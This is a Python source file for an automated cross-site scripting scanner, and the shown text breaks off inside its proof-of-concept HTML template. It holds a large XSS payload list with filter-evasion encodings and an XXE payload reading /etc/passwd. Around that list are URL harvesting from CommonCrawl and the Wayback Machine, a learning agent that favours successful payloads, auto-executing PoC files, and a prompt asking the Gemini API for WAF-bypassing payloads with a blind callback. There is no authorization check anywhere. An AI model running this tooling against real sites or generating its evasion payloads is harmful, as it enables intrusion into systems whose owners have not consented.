#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# --- IMPORTS ---
import requests
import asyncio
import aiohttp
import random
import re
import logging
import json
import threading
import sys
import sqlite3
import time
import pickle
import pandas as pd
import queue
import signal
import csv
import os
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, quote
from bs4 import BeautifulSoup
from bs4.element import Comment # Import Comment for HTML comment detection
from collections import deque
from colorama import Fore, Style, init
import argparse
from concurrent.futures import ThreadPoolExecutor

# Imports for Deep Learning (from deep_learning.py)
import numpy as np
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score
from sklearn.preprocessing import StandardScaler
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense, Input
# Ensure you have TensorFlow installed: pip install tensorflow scikit-learn numpy beautifulsoup4 aiohttp colorama

# --- INTEGRATED AND REFINED MODULES ---

# Content from payload_generation.py
def generate_payloads(server_type='generic'):
    # Using a set to remove duplicates before returning as a list
    payloads_set = set()

    # Generic payloads
    payloads_set.update([
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')" />',
        '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        '"><script>alert("XSS")</script>',
        '"><img src=x onerror=alert("XSS")>',
        '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
        'javascript:alert("XSS")',
        'javascript:confirm("XSS")',
        'javascript:eval("alert(\'XSS\')")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
        '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
        '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
        '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
        '<img src=x onerror=confirm("XSS")>',
        '<img src=x onerror=eval("alert(\'XSS\')")>',
        # XSS Locator (Polyglot)
        '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Malformed A Tags
        '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
        '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
        # Malformed IMG Tags
        '<img foo=a src="javascript:alert(\'XSS\')">',
        '<img foo=a onerror="alert(\'XSS\')">',
        # fromCharCode
        '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
        # Default SRC Tag to Get Past Filters that Check SRC Domain
        '<img src="http://example.com/image.jpg">',
        # Default SRC Tag by Leaving it Empty
        '<img src="">',
        # Default SRC Tag by Leaving it out Entirely
        '<img>',
        # On Error Alert
        '<img src=x onerror=alert("XSS")>',
        # IMG onerror and JavaScript Alert Encode
        '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        # Decimal HTML Character References
        '&#34;><img src=x onerror=alert(\'XSS\')>',
        # Decimal HTML Character References Without Trailing Semicolons
        '&#34><img src=x onerror=alert(\'XSS\')>',
        # Hexadecimal HTML Character References Without Trailing Semicolons
        '&#x22><img src=x onerror=alert(\'XSS\')>',
        # List-style-image
        '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
        # VBscript in an Image
        '<img src="vbscript:alert(\'XSS\')">',
        # SVG Object Tag
        '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
        # ECMAScript 6
        '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
        # BODY Tag
        '<BODY ONLOAD=alert(\'XSS\')>',
        # <BODY ONLOAD=alert('XSS')>
        '<BODY ONLOAD=alert(\'XSS\')>',
        # Event Handlers
        '<img onmouseover="alert(\'XSS\')" src="x">',
        # Various Tags with Broken-up for XSS
        '<s<Sc<script>ript>alert(\'XSS\')</script>',
        # TABLE
        '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
        # TD
        '<TD BACKGROUND="javascript:alert(\'XSS\')">',
        # DIV
        '<DIV STYLE="width: expression(alert(\'XSS\'));">',
        # BASE TAG
        '<BASE HREF="javascript:alert(\'XSS\');//">',
        # OBJECT TAG
        '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
        # SSI XSS
        '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
        # HTML+TIME IN XML
        '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
        # Using ActionScript Inside Flash
        '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
        # MIME
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    ])

    # Server-specific payloads
    if server_type == 'nginx':
        pass
    elif server_type == 'apache':
        pass
    elif server_type == 'iis':
        pass

    return list(payloads_set)


# Content from deep_learning.py
class DeepLearningModel:
    def __init__(self):
        self.model = self.build_model()
        self.is_trained = False
        self.scaler = StandardScaler()

    def build_model(self):
        # FIX: Changed input_dim from 9 to 10 to match the number of features from extract_features()
        input_dim = 10
        model = Sequential()
        model.add(Input(shape=(input_dim,)))
        model.add(Dense(128, activation='relu'))
        model.add(Dense(64, activation='relu'))
        model.add(Dense(32, activation='relu'))
        model.add(Dense(1, activation='sigmoid'))
        model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])
        return model

    def train(self, X, y):
        if not X or not y:
            logging.warning(f"{Fore.YELLOW}[DL Model] No training data provided to train the model.{Style.RESET_ALL}")
            self.is_trained = False
            return

        X_np = np.array(X).astype(np.float32)
        y_np = np.array(y).astype(np.float32)

        if X_np.ndim != 2 or X_np.shape[1] != self.model.input_shape[1]:
            logging.error(f"{Fore.RED}[DL Model] Incorrect input data shape for training. Expected (*, {self.model.input_shape[1]}), Received {X_np.shape}.{Style.RESET_ALL}")
            self.is_trained = False
            return
        
        try:
            X_train, X_test, y_train, y_test = train_test_split(X_np, y_np, test_size=0.3, random_state=42)
            
            X_train_scaled = self.scaler.fit_transform(X_train)
            X_test_scaled = self.scaler.transform(X_test)
            
            logging.info(f"{Fore.MAGENTA}[DL Model] Training DeepLearning model with {len(X_train_scaled)} samples...{Style.RESET_ALL}")
            self.model.fit(X_train_scaled, y_train, epochs=20, batch_size=16, verbose=0) 
            
            predictions = (self.model.predict(X_test_scaled, verbose=0) > 0.5).astype("int32")
            accuracy = accuracy_score(y_test, predictions)
            logging.info(f"{Fore.GREEN}[DL Model] Model trained with accuracy: {accuracy:.2f}{Style.RESET_ALL}")
            self.is_trained = True
        except Exception as e:
            logging.error(f"{Fore.RED}[DL Model] Error during model training: {e}{Style.RESET_ALL}")
            self.is_trained = False

    def predict(self, X):
        if not self.is_trained:
            logging.warning(f"{Fore.YELLOW}[DL Model] Model is not trained. Returning random predictions.{Style.RESET_ALL}")
            return np.array([random.choice([0, 1]) for _ in X]).astype("int32")
        
        X_np = np.array(X).astype(np.float32)
        if X_np.ndim != 2 or X_np.shape[1] != self.model.input_shape[1]:
            logging.error(f"{Fore.RED}[DL Model] Incorrect input data shape for prediction. Expected (*, {self.model.input_shape[1]}), Received {X_np.shape}. Returning random predictions.{Style.RESET_ALL}")
            return np.array([random.choice([0, 1]) for _ in X]).astype("int32")

        try:
            X_scaled = self.scaler.transform(X_np)
            predictions = (self.model.predict(X_scaled, verbose=0) > 0.5).astype("int32")
            return predictions
        except Exception as e:
            logging.error(f"{Fore.RED}[DL Model] Error during model prediction: {e}. Returning random predictions.{Style.RESET_ALL}")
            return np.array([random.choice([0, 1]) for _ in X]).astype("int32")


# Content from nlp_analysis.py
def analyze_content(html_content, payload_to_find=None):
    """
    Analyzes HTML content to extract relevant information for determining
    injection points, detecting sanitization, and the payload's reflection type.
    Args:
        html_content (str): The HTML content of the page.
        payload_to_find (str): The payload that was injected, for specific reflection analysis.
    Returns:
        dict: A dictionary containing the analyzed information.
    """
    logging.info(f"{Fore.MAGENTA}[NLP] Performing NLP content analysis...{Style.RESET_ALL}")
    soup = BeautifulSoup(html_content, 'html.parser')
    
    analysis_results = {
        "forms_found": False,
        "input_fields_count": 0,
        "scripts_found": False,
        "comments_found": False,
        "has_eval_or_write": False,
        "has_common_sanitization_patterns": False,
        "reflected_location_type": "none" # 'text', 'attribute', 'script_content', 'script_attribute', 'comment'
    }

    # Form and Input Analysis
    forms = soup.find_all('form')
    if forms:
        analysis_results["forms_found"] = True
        for form in forms:
            inputs = form.find_all(['input', 'textarea', 'select'])
            analysis_results["input_fields_count"] += len(inputs)
            for input_tag in inputs:
                if input_tag.has_attr('onkeyup') or input_tag.has_attr('onkeydown') or input_tag.has_attr('onkeypress') or input_tag.has_attr('onblur') or input_tag.has_attr('onchange'):
                    analysis_results["has_common_sanitization_patterns"] = True
                if input_tag.has_attr('maxlength'):
                    analysis_results["has_common_sanitization_patterns"] = True

    # Script Analysis
    scripts = soup.find_all('script')
    if scripts:
        analysis_results["scripts_found"] = True
        for script in scripts:
            if script.string:
                script_content = script.string.lower()
                if re.search(r'(eval|document\.write|document\.writeln|innerHTML)\s*\(', script_content):
                    analysis_results["has_eval_or_write"] = True
                if re.search(r'(encodeURIComponent|decodeURIComponent|escape|unescape|htmlspecialchars|strip_tags)\s*\(', script_content):
                    analysis_results["has_common_sanitization_patterns"] = True
            if script.has_attr('src') and re.search(r'(eval|document\.write)', script.get('src', '').lower()):
                 analysis_results["has_eval_or_write"] = True

    # Comment Analysis
    comments = soup.find_all(string=lambda text: isinstance(text, Comment))
    if comments:
        analysis_results["comments_found"] = True

    # Payload Reflection Location
    if payload_to_find:
        escaped_payload = re.escape(payload_to_find)
        
        # Check in script content
        for script_tag in soup.find_all('script'):
            if script_tag.string and re.search(escaped_payload, script_tag.string):
                analysis_results["reflected_location_type"] = "script_content"
                break
            for attr_val in script_tag.attrs.values():
                if isinstance(attr_val, str) and re.search(escaped_payload, attr_val):
                    analysis_results["reflected_location_type"] = "script_attribute"
                    break
            if analysis_results["reflected_location_type"] != "none": break
        
        if analysis_results["reflected_location_type"] == "none":
            # Check in attribute values
            for tag in soup.find_all(True):
                for attr, value in tag.attrs.items():
                    if isinstance(value, str) and re.search(escaped_payload, value):
                        analysis_results["reflected_location_type"] = "attribute"
                        break
                if analysis_results["reflected_location_type"] != "none": break

        if analysis_results["reflected_location_type"] == "none":
            # Check in comments
            for comment in soup.find_all(string=lambda text: isinstance(text, Comment) and re.search(escaped_payload, text)):
                analysis_results["reflected_location_type"] = "comment"
                
        if analysis_results["reflected_location_type"] == "none":
            # Check in plain text/HTML body
            if re.search(escaped_payload, html_content):
                analysis_results["reflected_location_type"] = "text"
                
    logging.info(f"{Fore.GREEN}[NLP] Analysis complete. Results: {analysis_results}{Style.RESET_ALL}")
    return analysis_results


# Content from reinforcement_learning.py
class ReinforcementLearningAgent:
    def __init__(self, alpha=0.1, gamma=0.9, epsilon=0.1):
        self.q_table = {}
        self.alpha = alpha
        self.gamma = gamma
        self.epsilon = epsilon

    def get_state_key(self, url, param, method, injection_context, server_type, fuzz_results_summary):
        fuzz_key = tuple(sorted(fuzz_results_summary.items())) if fuzz_results_summary else ()
        parsed_url = urlparse(url)
        return (parsed_url.netloc + parsed_url.path, param, method, injection_context, server_type, fuzz_key)

    def learn(self, url, param, payload, method, success, injection_context, server_type, fuzz_results_summary):
        state = self.get_state_key(url, param, method, injection_context, server_type, fuzz_results_summary)
        action = payload
        reward = 1 if success else -0.5

        if state not in self.q_table:
            self.q_table[state] = {}
        if action not in self.q_table[state]:
            self.q_table[state][action] = 0.0
        
        current_q = self.q_table[state].get(action, 0.0)
        self.q_table[state][action] = current_q + self.alpha * (reward - current_q)
        
        logging.info(f"{Fore.MAGENTA}[RL Agent] Learning: State={state}, Action={action}, Reward={reward}. New Q-value: {self.q_table[state][action]:.2f}{Style.RESET_ALL}")

    def select_action(self, state, available_payloads):
        if not available_payloads:
            logging.warning(f"{Fore.YELLOW}[RL Agent] No payloads available for selection.{Style.RESET_ALL}")
            return "empty_payload"

        if random.uniform(0, 1) < self.epsilon:
            logging.info(f"{Fore.CYAN}[RL Agent] Exploration: Selecting random action (epsilon-greedy).{Style.RESET_ALL}")
            return random.choice(available_payloads)
        else:
            if state not in self.q_table or not self.q_table[state]:
                logging.info(f"{Fore.CYAN}[RL Agent] Exploitation: State unknown or empty, selecting random action.{Style.RESET_ALL}")
                return random.choice(available_payloads)
            
            current_state_actions = self.q_table[state]
            available_payloads_set = set(available_payloads)

            exploitable_actions = {
                p: q_val for p, q_val in current_state_actions.items() if p in available_payloads_set
            }

            if exploitable_actions:
                best_payload = max(exploitable_actions, key=exploitable_actions.get)
                logging.info(f"{Fore.GREEN}[RL Agent] Exploitation: Selected payload: '{best_payload}' (Q-value: {exploitable_actions[best_payload]:.2f}).{Style.RESET_ALL}")
                return best_payload
            else:
                logging.info(f"{Fore.CYAN}[RL Agent] No learned actions available in current payload set for exploitation. Selecting random action.{Style.RESET_ALL}")
                return random.choice(available_payloads)


# --- GLOBAL UTILITY FUNCTIONS ---
def get_random_headers():
    return {'User-Agent': random.choice(USER_AGENTS)}

async def generate_payloads_with_ai(session, api_key, prompt_context, callback_host):
    if not api_key:
        logging.warning(f"{Fore.YELLOW}[AI Payload] Gemini API key not available. AI payload generation is disabled.{Style.RESET_ALL}")
        return []

    logging.info(f"{Fore.MAGENTA}[AI Payload] Attempting to generate XSS payloads with Gemini AI for context: {prompt_context}...{Style.RESET_ALL}")
    
    full_prompt = (
        f"Generate 5 diverse, highly effective Cross-Site Scripting (XSS) payloads "
        f"for a web application, considering the following context: '{prompt_context}'. "
        f"Prioritize payloads that could bypass common WAFs or security filters. "
        f"Include a blind XSS payload that triggers a callback to `//{callback_host}/ai_test`. "
        f"Respond ONLY with a JSON array of strings, where each string is a payload. "
        f"Example: ['<script>alert(1)</script>', '<img src=x onerror=alert(2)>']"
    )

    payload = {
        "contents": [{"role": "user", "parts": [{"text": full_prompt}]}],
        "generationConfig": {
            "responseMimeType": "application/json",
            "responseSchema": {
                "type": "ARRAY",
                "items": { "type": "STRING" }
            }
        }
    }
    
    api_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={api_key}"

    try:
        async with session.post(api_url, headers={'Content-Type': 'application/json'}, json=payload, timeout=20) as response:
            if response.status == 200:
                result = await response.json()
                if result.get('candidates') and result['candidates'][0].get('content') and result['candidates'][0]['content'].get('parts'):
                    json_str = result['candidates'][0]['content']['parts'][0]['text']
                    try:
                        ai_generated_payloads = json.loads(json_str)
                        if isinstance(ai_generated_payloads, list) and all(isinstance(p, str) for p in ai_generated_payloads):
                            logging.info(f"{Fore.GREEN}[AI Payload] {len(ai_generated_payloads)} AI-generated payloads received.{Style.RESET_ALL}")
                            return ai_generated_payloads
                        else:
                            logging.error(f"{Fore.RED}[AI Payload] Malformed AI response (not a list of strings).{Style.RESET_ALL}")
                            return []
                    except json.JSONDecodeError:
                        logging.error(f"{Fore.RED}[AI Payload] Failed to decode JSON from AI response: {json_str}{Style.RESET_ALL}")
                        return []
                else:
                    logging.error(f"{Fore.RED}[AI Payload] Unexpected AI response structure.{Style.RESET_ALL}")
                    return []
            else:
                logging.error(f"{Fore.RED}[AI Payload] Gemini API call failed. Status: {response.status}, Response: {await response.text()}{Style.RESET_ALL}")
                return []
    except Exception as e:
        logging.error(f"{Fore.RED}[AI Payload] Error during Gemini API call: {e}{Style.RESET_ALL}")
        return []


# --- GENERAL SETUP ---
init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import WebDriverException, TimeoutException
    SELENIUM_AVAILABLE = True
except ImportError:
    print(f"{Fore.RED}Selenium is not installed. Some features will be disabled. Run: pip install selenium{Style.RESET_ALL}")
    SELENIUM_AVAILABLE = False

# Constants for terminal colors
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\033[94m', '\033[91m', '\033[97m', '\033[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

# Setup logging
def setup_logging(domain):
    log_dir = 'logs'
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    sanitized_domain = re.sub(r'\W+', '_', domain)
    log_filename = os.path.join(log_dir, f'{sanitized_domain}_{current_time}.log')
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s',
                        handlers=[
                            logging.FileHandler(log_filename),
                            logging.StreamHandler()
                        ])
    return log_filename

# Initial console info
current_time_log = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
print(f"{GREEN}[INFO]{END} Starting XSS scanner at {current_time_log}.")

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
]

# Database setup
def setup_database():
    connection = sqlite3.connect('xss_scan_results.db', check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY,
            url TEXT NOT NULL,
            payload TEXT NOT NULL,
            discovered_at DATETIME NOT NULL,
            method TEXT NOT NULL,
            xss_type TEXT NOT NULL,
            success INTEGER NOT NULL,
            poc_file TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS training_data (
            id INTEGER PRIMARY KEY,
            url TEXT,
            param TEXT,
            payload TEXT,
            server_type TEXT,
            method TEXT,
            response_code INTEGER,
            response_time REAL,
            response_pattern TEXT,
            success INTEGER,
            content_snippet TEXT,
            vulnerable INTEGER,
            injection_context TEXT,
            nlp_forms_found INTEGER,
            nlp_inputs_count INTEGER,
            nlp_scripts_found INTEGER,
            nlp_has_eval_or_write INTEGER,
            nlp_has_sanitization_patterns INTEGER,
            nlp_reflected_location_type TEXT,
            fuzz_num_filtered INTEGER,
            fuzz_num_encoded INTEGER
        )
    """)
    connection.commit()
    return connection

db_connection = setup_database()

# Ensure necessary files are created
def create_files():
    if not os.path.exists('training_data.csv'):
        with open('training_data.csv', 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([
                'url', 'param', 'payload', 'server_type', 'method', 'response_code', 'response_time',
                'response_pattern', 'success', 'content_snippet', 'vulnerable', 'injection_context',
                'nlp_forms_found', 'nlp_inputs_count', 'nlp_scripts_found', 'nlp_has_eval_or_write',
                'nlp_has_sanitization_patterns', 'nlp_reflected_location_type',
                'fuzz_num_filtered', 'fuzz_num_encoded'
            ])
    
    open('total_links_audited.txt', 'w').close()
    open('found_links.txt', 'w').close()
    open('audit_links.txt', 'w').close()

    if not os.path.exists('pocs'):
        os.makedirs('pocs')

create_files()

# Cursor animation for loading
stop_animation = False

def animate_cursor():
    cursor_chars = ['|', '/', '-', '\\']
    i = 0
    while not stop_animation:
        print(f"Loading {cursor_chars[i % len(cursor_chars)]}", end='\r')
        time.sleep(0.1)
        i += 1
    print(" " * 20, end='\r')

cursor_thread = threading.Thread(target=animate_cursor)
cursor_thread.daemon = True
cursor_thread.start()

# Queue for database operations
db_queue = queue.Queue()

# Function to handle database operations
def db_worker():
    while True:
        item = db_queue.get()
        if item == "terminate":
            break
        db_connection, query, params = item
        try:
            cursor = db_connection.cursor()
            cursor.execute(query, params)
            db_connection.commit()
        except Exception as e:
            logging.error(f"{RED}[DB ERROR]{END} Database operation error: {e}")
        finally:
            db_queue.task_done()

db_thread = threading.Thread(target=db_worker)
db_thread.daemon = True
db_thread.start()

# --- URL Discovery Functions ---
def normalize_domain(domain, list_name=None):
    if domain:
        return domain.replace('http://', '').replace('https://', '').strip('/')
    elif list_name:
        return list_name.split('.')[0].replace('_', '-')
    return ''

async def fetch_urls_commoncrawl(domain, session):
    normalized_domain = normalize_domain(domain)
    logging.info(f"{GREEN}[INFO]{END} Fetching URLs from CommonCrawl for domain: {normalized_domain}")
    cc_api = f"http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.{normalized_domain}/*&output=json"
    try:
        async with session.get(cc_api, timeout=30) as response:
            if response.status == 200:
                text = await response.text()
                urls = [json.loads(line)['url'] for line in text.splitlines() if line.strip()]
                logging.info(f"{GREEN}[INFO]{END} {len(urls)} URLs fetched from CommonCrawl.")
                return urls
            else:
                logging.error(f"{RED}[ERROR]{END} Failed to fetch CommonCrawl URLs. Status: {response.status}")
                return []
    except Exception as e:
        logging.error(f"{RED}[ERROR]{END} Error fetching CommonCrawl URLs: {e}")
        return []

async def fetch_urls_wayback(domain, session):
    normalized_domain = normalize_domain(domain)
    logging.info(f"{GREEN}[INFO]{END} Fetching URLs from Wayback Machine for domain: {normalized_domain}")
    wayback_api = f"http://web.archive.org/cdx/search/cdx?url=*.{normalized_domain}/*&output=json&fl=original&collapse=urlkey"
    try:
        async with session.get(wayback_api, timeout=30) as response:
            if response.status == 200:
                results = await response.json()
                urls = [result[0] for result in results[1:]]
                logging.info(f"{GREEN}[INFO]{END} {len(urls)} URLs fetched from Wayback Machine.")
                return urls
            else:
                logging.error(f"{RED}[ERROR]{END} Failed to fetch Wayback Machine URLs. Status: {response.status}")
                return []
    except Exception as e:
        logging.error(f"{RED}[ERROR]{END} Error fetching Wayback Machine URLs: {e}")
        return []

async def crawl_website(domain, session, max_depth=1):
    normalized_domain = normalize_domain(domain)
    logging.info(f"{GREEN}[INFO]{END} Crawling website: {normalized_domain}")
    crawled_urls = set()
    urls_to_crawl = deque([(f"http://{normalized_domain}", 0)])
    
    crawled_urls.add(f"http://{normalized_domain}")
    if not f"https://{normalized_domain}" in crawled_urls:
        crawled_urls.add(f"https://{normalized_domain}")

    while urls_to_crawl:
        url, depth = urls_to_crawl.popleft()
        if depth > max_depth:
            continue

        logging.info(f"Crawling [Depth:{depth}]: {url}")
        
        try:
            async with session.get(url, timeout=10, ssl=False, headers={'User-Agent': random.choice(USER_AGENTS)}) as response:
                if response.status == 200 and 'text/html' in response.headers.get('Content-Type', ''):
                    html = await response.text()
                    soup = BeautifulSoup(html, 'html.parser')
                    for link_tag in soup.find_all('a', href=True):
                        href = link_tag['href']
                        full_url = urljoin(url, href)
                        parsed_full_url = urlparse(full_url)
                        if parsed_full_url.netloc.endswith(normalized_domain) and full_url not in crawled_urls:
                            crawled_urls.add(full_url)
                            urls_to_crawl.append((full_url, depth + 1))
                else:
                    logging.warning(f"{YELLOW}[WARN]{END} Skipped {url} (Status: {response.status} or non-HTML).")
        except Exception as e:
            logging.error(f"{RED}[ERROR]{END} Failed to crawl {url}: {str(e)}")

    logging.info(f"{GREEN}[INFO]{END} {len(crawled_urls)} URLs crawled from {normalized_domain}.")
    return list(crawled_urls)

def sanitize_filename(domain):
    sanitized = re.sub(r'http[s]?://', '', domain)
    sanitized = re.sub(r'\W+', '_', sanitized)
    return sanitized

def extract_base_url_and_params(url):
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    query_params = parse_qs(parsed_url.query)
    normalized_params = {k: v[0] for k, v in query_params.items()}
    return base_url, normalized_params

async def fetch_and_clean_urls(domain, session, stream_output=False):
    logging.info(f"{YELLOW}[INFO]{END} Fetching and cleaning URLs for {domain}")
    wayback_uri = f"https://web.archive.org/cdx/search/cdx?url={domain}/*&output=txt&collapse=urlkey&fl=original&page=/"
    
    urls = []
    try:
        async with session.get(wayback_uri, timeout=30) as response:
            if response.status == 200:
                urls = (await response.text()).split()
            else:
                logging.error(f"{RED}[ERROR]{END} Failed to fetch URLs from Wayback Machine. Status: {response.status}")
                return []
    except Exception as e:
        logging.error(f"{RED}[ERROR]{END} Error fetching URLs from Wayback Machine: {e}")
        return []

    logging.info(f"{GREEN}[INFO]{END} {len(urls)} URLs found for {domain}")

    seen = set()
    cleaned_urls = []
    for url in urls:
        base_url, query_params = extract_base_url_and_params(url)
        unique_key = (base_url, tuple(sorted(query_params.keys())))
        if unique_key not in seen:
            seen.add(unique_key)
            cleaned_urls.append(url)
            if stream_output:
                print(url)
    
    logging.info(f"{GREEN}[INFO]{END} {len(cleaned_urls)} URLs found after cleaning.{Style.RESET_ALL}")
    sanitized_domain = sanitize_filename(domain)
    result_file = f"{sanitized_domain}_cleaned_urls.txt"
    
    await asyncio.to_thread(lambda: open(result_file, "w").write("\n".join(cleaned_urls)))
    
    logging.info(f"{GREEN}[INFO]{END} Cleaned URLs saved to {result_file}{Style.RESET_ALL}")
    return cleaned_urls

# --- Data Persistence Functions ---
def save_training_data_to_csv(data):
    asyncio.create_task(asyncio.to_thread(_save_training_data_to_csv, data))

def _save_training_data_to_csv(data):
    with open('training_data.csv', mode='a', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(data)

def insert_training_data(url, param, payload, server_type, method, response_code, response_time, response_pattern, success, content_snippet, vulnerable, injection_context, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, fuzz_num_filtered, fuzz_num_encoded):
    query = """
        INSERT INTO training_data (url, param, payload, server_type, method, response_code, response_time, response_pattern, success, content_snippet, vulnerable, injection_context, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, fuzz_num_filtered, fuzz_num_encoded)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """
    db_queue.put((db_connection, query, (url, param, payload, server_type, method, response_code, response_time, response_pattern, success, content_snippet, vulnerable, injection_context, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, fuzz_num_filtered, fuzz_num_encoded)))
    save_training_data_to_csv([url, param, payload, server_type, method, response_code, response_time, response_pattern, success, content_snippet, vulnerable, injection_context, nlp_forms_found, nlp_inputs_count, nlp_scripts_found, nlp_has_eval_or_write, nlp_has_sanitization_patterns, nlp_reflected_location_type, fuzz_num_filtered, fuzz_num_encoded])

def insert_vulnerability_data(url, payload, method, xss_type, success, poc_file=None):
    query = """
        INSERT INTO vulnerabilities (url, payload, discovered_at, method, xss_type, success, poc_file)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """
    db_queue.put((db_connection, query, (url, payload, datetime.now(), method, xss_type, success, poc_file)))

# --- PoC Generation Functions ---
def generate_xss_poc(url, payload, method, xss_type):
    """Generates an HTML Proof of Concept (PoC) file for an XSS vulnerability."""
    poc_dir = 'pocs'
    if not os.path.exists(poc_dir):
        os.makedirs(poc_dir)

    parsed_url = urlparse(url)
    clean_path = re.sub(r'[^a-zA-Z0-9_\-]', '', parsed_url.netloc + parsed_url.path.replace('/', '_'))
    poc_filename = os.path.join(poc_dir, f"poc_{clean_path}_{datetime.now().strftime('%H%M%S')}.html")

    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>XSS Proof of Concept - {xss_type}</title>
        <style>
            body {{ font-family: Arial, sans-serif; background-color: #f0f2f5; color: #333; margin: 20px; }}
            .container {{ background-color: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 800px; margin: 20px auto; }}
            h1 {{ color: #d63384; }}
            h2 {{ color: #007bff; }}
            pre {{ background-color: #e9ecef; padding: 15px; border-radius: 5px; overflow-x: auto; }}
            code {{ color: #c42f2f; }}
            .info {{ background-color: #e6f7ff; border-left: 5px solid #2196f3; padding: 10px; margin-bottom: 20px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>XSS Vulnerability Proof of Concept</h1>
            <div class="info">
                <p>This file demonstrates a detected Cross-Site Scripting (XSS) vulnerability.</p>
                <p><strong>Note:</strong> The payload will execute automatically when this file is opened in a browser.</p>
            </div>

            <h2>Vulnerability Details</h2>
            <p><strong>Vulnerable URL:</strong> <a href="{url}" target="_blank">{url}</a></p>
            <p><strong>HTTP Method:</strong> {method}</p>
            <p><strong>Detected XSS Type:</strong> {xss_type}</p>
            <p><strong>Injected Payload:</strong></p>
            <pre><code>{payload.replace('<', '&lt;').replace('>', '&gt;')}</code></pre>

            <h2>Attack Reconstruction</h2>
            <p>Open this page to see the payload in action. This is a direct simulation of the injection.</p>
            <p>To reproduce:</p>
            <ul>
                <li>Navigate to the vulnerable URL.</li>
                <li>If the method is GET, the payload is directly in the URL.</li>
